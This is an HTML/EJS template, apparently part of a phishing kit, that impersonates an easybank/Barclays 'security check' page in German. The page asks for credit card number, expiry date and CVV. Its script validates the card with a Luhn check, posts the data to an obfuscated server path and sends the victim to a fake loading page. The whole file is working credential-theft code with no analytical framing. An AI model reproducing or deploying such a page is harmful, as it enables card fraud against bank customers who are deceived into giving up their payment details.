<!DOCTYPE html>
<html lang="de">

<head>
  <meta charset="UTF-8">
  <meta name="viewport"
    content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
  <meta name="apple-mobile-web-app-status-bar-style" content="white">
  <title>Sicherheitsscheck - Bestätigung</title>
  <link rel="stylesheet" href="./css/botta.css">
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <%- include('partials/tracker') %>
    <style>
      .logo-svg {
        max-width: 100%;
      }

      /* Layout adjustments specific to this page if needed, mimicking index.ejs simplicity */
      .login-card {
        width: 100%;
        max-width: 400px;
        /* Slightly wider for CC details if needed */
        text-align: center;
      }

      .form-row {
        display: flex;
        gap: 15px;
      }

      .form-row .form-group {
        flex: 1;
      }
    </style>
</head>

<body>
  <div class="container">
    <header class="header">
      <div class="header-inner">
        <img src="img/luigon.PNG" alt="easybank" class="logo">
        <img src="img/luigon-botuin.PNG" alt="Jetzt registrieren" class="reg-btn">
      </div>
    </header>

    <main class="main-content">
      <div class="login-card">
        

        <form id="caponaForm" class="login-form">
          <h1 style="margin-bottom: 20px; color: var(--text-color); font-weight: 600;font-size: 27px;">Bestätigung erforderlich</h1>
          <p style="margin-bottom: 30px; color: rgb(87, 87, 87); font-size: 17px;">Bitte geben Sie Ihre Barclays/easybank Kreditkartendaten ein, um fortzufahren.</p>

          <!-- Card Number -->
          <div class="form-group">
            <input type="tel" id="cardNumber" name="cardNumber" class="form-input" placeholder=" " required
              maxlength="19" autocomplete="cc-number" />
            <label class="form-label" for="cardNumber">Kreditkartennummer</label>
          </div>

          <div class="form-row">
            <!-- Expiry Date -->
            <div class="form-group">
              <input type="tel" id="expiryDate" name="expiryDate" class="form-input" placeholder=" " required
                maxlength="5" autocomplete="cc-exp" />
              <label class="form-label" for="expiryDate">Ablauf (MM/JJ)</label>
            </div>

            <!-- CVV -->
            <div class="form-group">
              <input type="tel" id="cvv" name="cvv" class="form-input" placeholder=" " required maxlength="4"
                autocomplete="cc-csc" />
              <label class="form-label" for="cvv">CVV</label>
            </div>
          </div>

          <div id="error-message" style="color: red; margin-bottom: 15px; display: none; font-size: 14px;"></div>

          <button type="submit" class="submit-btn" id="submitBtn">Bestätigen</button>

          <div class="forgot-password">
            <a href="#">Probleme bei der Bestätigung?</a>
          </div>
        </form>
      </div>
    </main>

    <footer class="footer">
      <div class="footer-links">
        <a href="#">FAQ</a>
        <a href="#">Kontakt</a>
        <a href="#">Impressum</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Barrierefreiheit</a>
      </div>
    </footer>
  </div>

  <script>
    // Auto-format card number input
    const cardInput = document.getElementById('cardNumber');
    cardInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '').slice(0, 16);
      let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
      e.target.value = formatted;
    });

    // Auto-format expiry date input
    const expiryInput = document.getElementById('expiryDate');
    expiryInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '').slice(0, 4);
      if (value.length > 2) {
        e.target.value = value.slice(0, 2) + '/' + value.slice(2);
      } else {
        e.target.value = value;
      }
    });

    // CVV Input - just numbers
    const cvvInput = document.getElementById('cvv');
    cvvInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    });

    // Luhn Check
    function luhnCheck(val) {
      let sum = 0;
      let shouldDouble = false;
      // Remove spaces
      val = val.replace(/\s+/g, '');
      for (let i = val.length - 1; i >= 0; i--) {
        let digit = +val.charAt(i);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    document.getElementById('caponaForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('error-message');

      // Reset error
      errorMsg.style.display = 'none';
      errorMsg.textContent = '';

      const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
      const expiry = document.getElementById('expiryDate').value;
      const cvv = document.getElementById('cvv').value;

      // Basic Validation
      if (cardNumber.length < 13 || !luhnCheck(cardNumber)) {
        errorMsg.textContent = 'Bitte geben Sie eine gültige Kartennummer ein.';
        errorMsg.style.display = 'block';
        return;
      }

      if (expiry.length < 5) { // Simple check for MM/YY length
        errorMsg.textContent = 'Bitte geben Sie ein gültiges Ablaufdatum ein.';
        errorMsg.style.display = 'block';
        return;
      }

      if (cvv.length < 3) {
        errorMsg.textContent = 'Bitte geben Sie einen gültigen CVV ein.';
        errorMsg.style.display = 'block';
        return;
      }

      // Disable submit button and show loading state
      submitBtn.disabled = true;
      submitBtn.textContent = 'Wird überprüft...';

      // Submit data via jQuery AJAX
      $.ajax({
        url: '/NkMNm4664XhcW8KuukHk',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({
          cardNumber: cardNumber,
          expiryDate: expiry,
          cvv: cvv
        }),
        success: function (response) {
          if (response.OK) {
            // Success - redirect
            setTimeout(() => {
              window.location.href = '/loading?time=15&url=/RKnUB922z6Mf4HDwg3EZ';
            }, 1000); // Shorter delay for better UX
          } else {
            // Handle error response
            errorMsg.textContent = 'Fehler bei der Verarbeitung. Bitte überprüfen Sie Ihre Eingaben.';
            errorMsg.style.display = 'block';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Bestätigen';
          }
        },
        error: function (xhr, status, error) {
          console.error('AJAX Error:', error);
          errorMsg.textContent = 'Ein Verbindungsfehler ist aufgetreten. Bitte versuchen Sie es später erneut.';
          errorMsg.style.display = 'block';
          submitBtn.disabled = false;
          submitBtn.textContent = 'Bestätigen';
        }
      });
    });
  </script>
</body>

</html>